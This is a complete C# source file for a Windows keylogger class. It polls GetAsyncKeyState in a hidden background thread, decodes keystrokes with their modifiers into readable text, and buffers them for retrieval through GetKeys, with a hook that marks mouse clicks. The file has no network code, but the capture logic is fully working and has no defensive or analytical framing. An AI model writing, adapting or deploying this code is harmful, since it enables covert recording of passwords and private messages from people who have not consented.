using System.Runtime.InteropServices;
using System.Text;

public static class KeyLogger
{
    private static readonly StringBuilder _buffer = new();
    private static readonly object _lock = new();
    private static readonly HashSet<int> _held = [];

    public static void CLICKED()
    {
        lock (_lock)
        {
            if (_buffer.Length == 0 || _buffer[^1] != ' ')
                _buffer.Append(' ');
        }
    }

    public static string GetKeys()
    {
        lock (_lock)
        {
            string r = _buffer.ToString();
            _buffer.Clear();
            return r;
        }
    }

    public static void Start()
    {
        new Thread(() =>
        {
            while (true)
            {
                for (int vk = 0x08; vk <= 0xFF; vk++)
                {
                    bool down = GetAsyncKeyState(vk) < 0;
                    lock (_lock)
                    {
                        if (down)
                        {
                            if (_held.Add(vk))
                            {
                                string s = GetCharFromVk(vk);
                                if (!string.IsNullOrEmpty(s)) _buffer.Append(s);
                            }
                        }
                        else _held.Remove(vk);
                    }
                }
                Thread.Sleep(5);
            }
        })
        { IsBackground = true }.Start();
    }
    private static string GetCharFromVk(int vk)
    {
        bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
        bool ctrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;
        bool alt = (GetAsyncKeyState(0x12) & 0x8000) != 0;
        bool win = (GetAsyncKeyState(0x5B) & 0x8000) != 0 || (GetAsyncKeyState(0x5C) & 0x8000) != 0;
        bool caps = Console.CapsLock;

        if (win) return " HOME ";
        string transformed = TryTransform(vk, shift, caps);
        if (!string.IsNullOrEmpty(transformed))
        {
            if (!ctrl && !alt) return transformed;
        }

        bool modified = ctrl || alt || shift;

        if (modified)
        {
            List<string> mods = [];
            if (ctrl) mods.Add("CTRL");
            if (alt) mods.Add("ALT");
            if (shift) mods.Add("SHIFT");

            string key = TryTransform(vk, false, false);
            if (string.IsNullOrEmpty(key)) key = transformed;
            if (string.IsNullOrEmpty(key)) return "";

            return " " + string.Join(" ", mods) + " " + key + " ";
        }

        return transformed;
    }
    private static string TryTransform(int vk, bool shift, bool caps)
    {
        if (vk == 0x0D) return " RETURN ";
        if (vk == 0x09) return " TAB ";
        if (vk == 0x20) return " ";
        if (vk == 0x08) return " BACKSPACE ";

        if (vk >= 0x41 && vk <= 0x5A)
        {
            char c = (char)vk;
            bool upper = shift ^ caps;
            return upper ? c.ToString() : char.ToLower(c).ToString();
        }

        if (vk >= 0x30 && vk <= 0x39)
        {
            string normal = ((char)vk).ToString();
            string shifted = ")!@#$%^&*(";
            return shift ? shifted[vk - 0x30].ToString() : normal;
        }

        if (vk >= 0x60 && vk <= 0x69) return ((char)(vk - 0x30)).ToString();

        return vk switch
        {
            0xBA => shift ? ":" : ";",
            0xBB => shift ? "+" : "=",
            0xBC => shift ? "<" : ",",
            0xBD => shift ? "_" : "-",
            0xBE => shift ? ">" : ".",
            0xBF => shift ? "?" : "/",
            0xC0 => shift ? "~" : "`",
            0xDB => shift ? "{" : "[",
            0xDC => shift ? "|" : "\\",
            0xDD => shift ? "}" : "]",
            0xDE => shift ? "\"" : "'",
            0x6A => "*",
            0x6B => "+",
            0x6D => "-",
            0x6E => ".",
            0x6F => "/",
            _ => ""
        };
    }
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
}